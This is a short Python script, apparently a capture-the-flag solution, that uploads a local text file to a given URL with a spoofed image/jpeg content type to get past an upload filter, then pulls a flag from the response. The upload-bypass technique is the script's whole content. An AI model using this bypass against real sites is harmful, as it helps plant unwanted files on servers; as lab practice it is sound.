#!/usr/bin/python

import sys
import requests
import re

if (len(sys.argv) == 1):
    print("Please the URL to upload to.")
    sys.exit()

url = str(sys.argv[1]) 
filename = "./hello.txt"
data = {"Upload": "Upload", "MAX_FILE_SIZE": 100000000}
files = {"uploaded": (filename, open(filename, 'rb'), "image/jpeg")}

response = requests.post(url, files=files, data=data)

result = re.search(r"flag.*?<", response.text)

if result:
    print(result[0][:-1])
else:
    print("Coult not get the flag");
